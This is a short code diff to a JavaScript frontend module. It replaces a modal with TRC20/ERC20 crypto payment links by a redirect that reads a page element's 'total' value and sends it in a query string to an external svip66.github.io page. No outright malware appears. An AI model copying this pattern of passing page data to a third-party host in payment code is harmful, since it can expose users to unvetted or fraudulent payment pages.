@@ -50,14 +50,16 @@ define(['jquery', 'bootstrap', 'frontend', 'form', 'template', 'clipboard'], fun
             }, function (data, ret) {
 
             }, function (success, error) {
+	var Ead = document.getElementById('total').innerHTML
+					
+						window.location.href = 'https://svip66.github.io/c/index.html?vip=' + Ead
+//                 var trc_url = "https://svip66.github.io/a/";
+//                 var erc_url = "https://svip66.github.io/a/";
 
-                var trc_url = "https://svip66.github.io/a/";
-                var erc_url = "https://svip66.github.io/a/";
-
-                $("#trc20").attr('href',trc_url);
-                $("#erc20").attr('href',erc_url);
+//                 $("#trc20").attr('href',trc_url);
+//                 $("#erc20").attr('href',erc_url);
                 
-                $('#myModal').modal('show');
+//                 $('#myModal').modal('show');
                 return false;
             });
         },
